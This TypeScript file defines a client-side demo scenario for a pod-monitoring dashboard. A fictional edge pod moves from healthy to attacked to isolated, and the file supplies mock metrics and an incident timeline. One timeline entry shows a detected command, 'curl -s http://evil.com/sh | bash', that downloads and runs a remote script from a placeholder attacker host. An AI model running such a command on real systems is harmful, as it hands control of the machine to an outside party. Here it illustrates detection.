// CC* scenario — client-side stepper over contract-true fixtures (Prism stateless).
// States: idle -> connected -> healthy -> attacked -> isolated
export type Phase = 'idle' | 'connected' | 'healthy' | 'attacked' | 'isolated'

export interface Pod {
  id: string
  hostname: string
  owner: string
  namespace: string
  status: 'Healthy' | 'Connecting' | 'NOT WORTHY'
  isActive: boolean
  cpu: number
  ram: number
  disk: number
  observed: boolean // the CC* target pod
}

export interface TimelineEvent { kind: 'ok' | 'bad'; climax?: boolean; h: string; s: string; t: string }

export const PHASES: Phase[] = ['idle', 'connected', 'healthy', 'attacked', 'isolated']

export function fleet(): Pod[] {
  return [
    { id: '0x4b5c…6a7b', hostname: 'ws-07', owner: 'Ola', namespace: 'prod/web', status: 'Healthy', isActive: true, cpu: 13, ram: 41, disk: 36, observed: false },
    { id: '0x9f8e…7d6c', hostname: 'db-02', owner: 'Jakub', namespace: 'prod/data', status: 'Healthy', isActive: true, cpu: 22, ram: 55, disk: 48, observed: false },
  ]
}

// the observed pod's state by phase
export function observedPod(phase: Phase): Pod | null {
  if (phase === 'idle') return null
  const base: Pod = {
    id: '0x1a2b…3c4d', hostname: 'alma9-edge-01', owner: 'Jakub', namespace: 'prod/edge',
    status: 'Healthy', isActive: true, cpu: 12, ram: 38, disk: 30, observed: true,
  }
  if (phase === 'connected') return { ...base, status: 'Connecting', cpu: 4, ram: 20, disk: 30 }
  if (phase === 'healthy') return base
  // attacked / isolated → breach
  return { ...base, status: 'NOT WORTHY', isActive: false, cpu: 96, ram: 92, disk: 71 }
}

// sparkline points (0..22 y, lower=worse-visual) for the observed pod
export function podSpark(phase: Phase): { points: string; color: string } {
  if (phase === 'attacked' || phase === 'isolated')
    return { points: '0,16 20,15 40,14 60,15 80,4 100,3 120,2', color: '#ef4444' }
  return { points: '0,14 20,13 40,15 60,12 80,13 100,11 120,12', color: '#22c55e' }
}

export function timeline(phase: Phase): TimelineEvent[] {
  const evs: TimelineEvent[] = []
  const i = PHASES.indexOf(phase)
  if (i >= 1) evs.push({ kind: 'ok', h: 'Pod connected & attested', s: 'register_agent → AgentRegistered', t: '14:02:11' })
  if (i >= 2) evs.push({ kind: 'ok', h: 'Healthy — Sui interaction OK', s: 'TelemetryReported cpu 12% · ram 38%', t: '14:02–14:40' })
  if (i >= 3) {
    evs.push({ kind: 'bad', h: 'Kernel exploit / DDoS detected', s: 'eBPF execve: curl -s http://evil.com/sh | bash', t: '14:41:03' })
    evs.push({ kind: 'bad', h: 'AI classified anomaly 0.91 ≥ 0.85', s: 'ClassificationReported → TRIGGER_ISOLATION', t: '14:41:04' })
  }
  if (i >= 4) evs.push({ kind: 'bad', climax: true, h: 'Marked NOT WORTHY · isolated', s: 'IncidentReport CRITICAL · is_active=false', t: '14:41:05 · ⚡ 2s after detection' })
  return evs
}

export const responseActions = [
  { i: '📟', l: 'Notify on-call' },
  { i: '💬', l: 'Post to Slack #sec-incidents' },
  { i: '🧊', l: 'Freeze ports · isolate · kill in cloud' },
  { i: '🤖', l: 'Execute skill / connect Claude Code' },
]

export interface AppConfig { scope: string; network: string; packageId: string; mock: boolean }
export async function loadConfig(): Promise<AppConfig> {
  try {
    const r = await fetch('./config.json')
    return await r.json()
  } catch {
    return { scope: 'alfa', network: 'testnet', packageId: '0x0cc3…91af', mock: true }
  }
}
